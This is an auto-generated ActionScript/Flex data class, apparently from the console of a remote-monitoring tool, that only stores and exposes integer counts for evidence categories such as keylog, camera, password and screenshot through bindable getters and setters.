/**
 * This is a generated class and is not intended for modification.  To customize behavior
 * of this value object you may modify the generated sub-class of this class - StatEvidence.as.
 */

package it.ht.rcs.console.search.model
{
import com.adobe.fiber.services.IFiberManagingService;
import com.adobe.fiber.valueobjects.IValueObject;
import flash.events.EventDispatcher;
import mx.collections.ArrayCollection;
import mx.events.PropertyChangeEvent;

import flash.net.registerClassAlias;
import flash.net.getClassByAlias;
import com.adobe.fiber.core.model_internal;
import com.adobe.fiber.valueobjects.IPropertyIterator;
import com.adobe.fiber.valueobjects.AvailablePropertyIterator;

use namespace model_internal;

[ExcludeClass]
public class _Super_StatEvidence extends flash.events.EventDispatcher implements com.adobe.fiber.valueobjects.IValueObject
{
    model_internal static function initRemoteClassAliasSingle(cz:Class) : void
    {
    }

    model_internal static function initRemoteClassAliasAllRelated() : void
    {
    }

    model_internal var _dminternal_model : _StatEvidenceEntityMetadata;
    model_internal var _changedObjects:mx.collections.ArrayCollection = new ArrayCollection();

    public function getChangedObjects() : Array
    {
        _changedObjects.addItemAt(this,0);
        return _changedObjects.source;
    }

    public function clearChangedObjects() : void
    {
        _changedObjects.removeAll();
    }

    /**
     * properties
     */
    private var _internal_position : int;
    private var _internal_message : int;
    private var _internal_call : int;
    private var _internal_mic : int;
    private var _internal_application : int;
    private var _internal_mouse : int;
    private var _internal_money : int;
    private var _internal_screenshot : int;
    private var _internal_camera : int;
    private var _internal_chat : int;
    private var _internal_password : int;
    private var _internal_print : int;
    private var _internal_upload : int;
    private var _internal_url : int;
    private var _internal_file : int;
    private var _internal_addressbook : int;
    private var _internal_calendar : int;
    private var _internal_device : int;
    private var _internal_keylog : int;
    private var _internal_clipboard : int;
    private var _internal_photo : int;

    private static var emptyArray:Array = new Array();


    /**
     * derived property cache initialization
     */
    model_internal var _cacheInitialized_isValid:Boolean = false;

    model_internal var _changeWatcherArray:Array = new Array();

    public function _Super_StatEvidence()
    {
        _model = new _StatEvidenceEntityMetadata(this);

        // Bind to own data or source properties for cache invalidation triggering

    }

    /**
     * data/source property getters
     */

    [Bindable(event="propertyChange")]
    public function get position() : int
    {
        return _internal_position;
    }

    [Bindable(event="propertyChange")]
    public function get message() : int
    {
        return _internal_message;
    }

    [Bindable(event="propertyChange")]
    public function get call() : int
    {
        return _internal_call;
    }

    [Bindable(event="propertyChange")]
    public function get mic() : int
    {
        return _internal_mic;
    }

    [Bindable(event="propertyChange")]
    public function get application() : int
    {
        return _internal_application;
    }

    [Bindable(event="propertyChange")]
    public function get mouse() : int
    {
        return _internal_mouse;
    }

    [Bindable(event="propertyChange")]
    public function get money() : int
    {
        return _internal_money;
    }

    [Bindable(event="propertyChange")]
    public function get screenshot() : int
    {
        return _internal_screenshot;
    }

    [Bindable(event="propertyChange")]
    public function get camera() : int
    {
        return _internal_camera;
    }

    [Bindable(event="propertyChange")]
    public function get chat() : int
    {
        return _internal_chat;
    }

    [Bindable(event="propertyChange")]
    public function get password() : int
    {
        return _internal_password;
    }

    [Bindable(event="propertyChange")]
    public function get print() : int
    {
        return _internal_print;
    }

    [Bindable(event="propertyChange")]
    public function get upload() : int
    {
        return _internal_upload;
    }

    [Bindable(event="propertyChange")]
    public function get url() : int
    {
        return _internal_url;
    }

    [Bindable(event="propertyChange")]
    public function get file() : int
    {
        return _internal_file;
    }

    [Bindable(event="propertyChange")]
    public function get addressbook() : int
    {
        return _internal_addressbook;
    }

    [Bindable(event="propertyChange")]
    public function get calendar() : int
    {
        return _internal_calendar;
    }

    [Bindable(event="propertyChange")]
    public function get device() : int
    {
        return _internal_device;
    }

    [Bindable(event="propertyChange")]
    public function get keylog() : int
    {
        return _internal_keylog;
    }

    [Bindable(event="propertyChange")]
    public function get clipboard() : int
    {
        return _internal_clipboard;
    }

    [Bindable(event="propertyChange")]
    public function get photo() : int
    {
        return _internal_photo;
    }

    public function clearAssociations() : void
    {
    }

    /**
     * data/source property setters
     */

    public function set position(value:int) : void
    {
        var oldValue:int = _internal_position;
        if (oldValue !== value)
        {
            _internal_position = value;
            this.dispatchEvent(mx.events.PropertyChangeEvent.createUpdateEvent(this, "position", oldValue, _internal_position));
        }
    }

    public function set message(value:int) : void
    {
        var oldValue:int = _internal_message;
        if (oldValue !== value)
        {
            _internal_message = value;
            this.dispatchEvent(mx.events.PropertyChangeEvent.createUpdateEvent(this, "message", oldValue, _internal_message));
        }
    }

    public function set call(value:int) : void
    {
        var oldValue:int = _internal_call;
        if (oldValue !== value)
        {
            _internal_call = value;
            this.dispatchEvent(mx.events.PropertyChangeEvent.createUpdateEvent(this, "call", oldValue, _internal_call));
        }
    }

    public function set mic(value:int) : void
    {
        var oldValue:int = _internal_mic;
        if (oldValue !== value)
        {
            _internal_mic = value;
            this.dispatchEvent(mx.events.PropertyChangeEvent.createUpdateEvent(this, "mic", oldValue, _internal_mic));
        }
    }

    public function set application(value:int) : void
    {
        var oldValue:int = _internal_application;
        if (oldValue !== value)
        {
            _internal_application = value;
            this.dispatchEvent(mx.events.PropertyChangeEvent.createUpdateEvent(this, "application", oldValue, _internal_application));
        }
    }

    public function set mouse(value:int) : void
    {
        var oldValue:int = _internal_mouse;
        if (oldValue !== value)
        {
            _internal_mouse = value;
            this.dispatchEvent(mx.events.PropertyChangeEvent.createUpdateEvent(this, "mouse", oldValue, _internal_mouse));
        }
    }

    public function set money(value:int) : void
    {
        var oldValue:int = _internal_money;
        if (oldValue !== value)
        {
            _internal_money = value;
            this.dispatchEvent(mx.events.PropertyChangeEvent.createUpdateEvent(this, "money", oldValue, _internal_money));
        }
    }

    public function set screenshot(value:int) : void
    {
        var oldValue:int = _internal_screenshot;
        if (oldValue !== value)
        {
            _internal_screenshot = value;
            this.dispatchEvent(mx.events.PropertyChangeEvent.createUpdateEvent(this, "screenshot", oldValue, _internal_screenshot));
        }
    }

    public function set camera(value:int) : void
    {
        var oldValue:int = _internal_camera;
        if (oldValue !== value)
        {
            _internal_camera = value;
            this.dispatchEvent(mx.events.PropertyChangeEvent.createUpdateEvent(this, "camera", oldValue, _internal_camera));
        }
    }

    public function set chat(value:int) : void
    {
        var oldValue:int = _internal_chat;
        if (oldValue !== value)
        {
            _internal_chat = value;
            this.dispatchEvent(mx.events.PropertyChangeEvent.createUpdateEvent(this, "chat", oldValue, _internal_chat));
        }
    }

    public function set password(value:int) : void
    {
        var oldValue:int = _internal_password;
        if (oldValue !== value)
        {
            _internal_password = value;
            this.dispatchEvent(mx.events.PropertyChangeEvent.createUpdateEvent(this, "password", oldValue, _internal_password));
        }
    }

    public function set print(value:int) : void
    {
        var oldValue:int = _internal_print;
        if (oldValue !== value)
        {
            _internal_print = value;
            this.dispatchEvent(mx.events.PropertyChangeEvent.createUpdateEvent(this, "print", oldValue, _internal_print));
        }
    }

    public function set upload(value:int) : void
    {
        var oldValue:int = _internal_upload;
        if (oldValue !== value)
        {
            _internal_upload = value;
            this.dispatchEvent(mx.events.PropertyChangeEvent.createUpdateEvent(this, "upload", oldValue, _internal_upload));
        }
    }

    public function set url(value:int) : void
    {
        var oldValue:int = _internal_url;
        if (oldValue !== value)
        {
            _internal_url = value;
            this.dispatchEvent(mx.events.PropertyChangeEvent.createUpdateEvent(this, "url", oldValue, _internal_url));
        }
    }

    public function set file(value:int) : void
    {
        var oldValue:int = _internal_file;
        if (oldValue !== value)
        {
            _internal_file = value;
            this.dispatchEvent(mx.events.PropertyChangeEvent.createUpdateEvent(this, "file", oldValue, _internal_file));
        }
    }

    public function set addressbook(value:int) : void
    {
        var oldValue:int = _internal_addressbook;
        if (oldValue !== value)
        {
            _internal_addressbook = value;
            this.dispatchEvent(mx.events.PropertyChangeEvent.createUpdateEvent(this, "addressbook", oldValue, _internal_addressbook));
        }
    }

    public function set calendar(value:int) : void
    {
        var oldValue:int = _internal_calendar;
        if (oldValue !== value)
        {
            _internal_calendar = value;
            this.dispatchEvent(mx.events.PropertyChangeEvent.createUpdateEvent(this, "calendar", oldValue, _internal_calendar));
        }
    }

    public function set device(value:int) : void
    {
        var oldValue:int = _internal_device;
        if (oldValue !== value)
        {
            _internal_device = value;
            this.dispatchEvent(mx.events.PropertyChangeEvent.createUpdateEvent(this, "device", oldValue, _internal_device));
        }
    }

    public function set keylog(value:int) : void
    {
        var oldValue:int = _internal_keylog;
        if (oldValue !== value)
        {
            _internal_keylog = value;
            this.dispatchEvent(mx.events.PropertyChangeEvent.createUpdateEvent(this, "keylog", oldValue, _internal_keylog));
        }
    }

    public function set clipboard(value:int) : void
    {
        var oldValue:int = _internal_clipboard;
        if (oldValue !== value)
        {
            _internal_clipboard = value;
            this.dispatchEvent(mx.events.PropertyChangeEvent.createUpdateEvent(this, "clipboard", oldValue, _internal_clipboard));
        }
    }

    public function set photo(value:int) : void
    {
        var oldValue:int = _internal_photo;
        if (oldValue !== value)
        {
            _internal_photo = value;
            this.dispatchEvent(mx.events.PropertyChangeEvent.createUpdateEvent(this, "photo", oldValue, _internal_photo));
        }
    }

    /**
     * Data/source property setter listeners
     *
     * Each data property whose value affects other properties or the validity of the entity
     * needs to invalidate all previously calculated artifacts. These include:
     *  - any derived properties or constraints that reference the given data property.
     *  - any availability guards (variant expressions) that reference the given data property.
     *  - any style validations, message tokens or guards that reference the given data property.
     *  - the validity of the property (and the containing entity) if the given data property has a length restriction.
     *  - the validity of the property (and the containing entity) if the given data property is required.
     */


    /**
     * valid related derived properties
     */
    model_internal var _isValid : Boolean;
    model_internal var _invalidConstraints:Array = new Array();
    model_internal var _validationFailureMessages:Array = new Array();

    /**
     * derived property calculators
     */
    

    /**
     * isValid calculator
     */
    model_internal function calculateIsValid():Boolean
    {
        var violatedConsts:Array = new Array();
        var validationFailureMessages:Array = new Array();

        var propertyValidity:Boolean = true;

        model_internal::_cacheInitialized_isValid = true;
        model_internal::invalidConstraints_der = violatedConsts;
        model_internal::validationFailureMessages_der = validationFailureMessages;
        return violatedConsts.length == 0 && propertyValidity;
    }

    /**
     * derived property setters
     */

    model_internal function set isValid_der(value:Boolean) : void
    {
        var oldValue:Boolean = model_internal::_isValid;
        if (oldValue !== value)
        {
            model_internal::_isValid = value;
            _model.model_internal::fireChangeEvent("isValid", oldValue, model_internal::_isValid);
        }
    }

    /**
     * derived property getters
     */

    [Transient]
    [Bindable(event="propertyChange")]
    public function get _model() : _StatEvidenceEntityMetadata
    {
        return model_internal::_dminternal_model;
    }

    public function set _model(value : _StatEvidenceEntityMetadata) : void
    {
        var oldValue : _StatEvidenceEntityMetadata = model_internal::_dminternal_model;
        if (oldValue !== value)
        {
            model_internal::_dminternal_model = value;
            this.dispatchEvent(mx.events.PropertyChangeEvent.createUpdateEvent(this, "_model", oldValue, model_internal::_dminternal_model));
        }
    }

    /**
     * methods
     */


    /**
     *  services
     */
    private var _managingService:com.adobe.fiber.services.IFiberManagingService;

    public function set managingService(managingService:com.adobe.fiber.services.IFiberManagingService):void
    {
        _managingService = managingService;
    }

    model_internal function set invalidConstraints_der(value:Array) : void
    {
        var oldValue:Array = model_internal::_invalidConstraints;
        // avoid firing the event when old and new value are different empty arrays
        if (oldValue !== value && (oldValue.length > 0 || value.length > 0))
        {
            model_internal::_invalidConstraints = value;
            _model.model_internal::fireChangeEvent("invalidConstraints", oldValue, model_internal::_invalidConstraints);
        }
    }

    model_internal function set validationFailureMessages_der(value:Array) : void
    {
        var oldValue:Array = model_internal::_validationFailureMessages;
        // avoid firing the event when old and new value are different empty arrays
        if (oldValue !== value && (oldValue.length > 0 || value.length > 0))
        {
            model_internal::_validationFailureMessages = value;
            _model.model_internal::fireChangeEvent("validationFailureMessages", oldValue, model_internal::_validationFailureMessages);
        }
    }


}

}
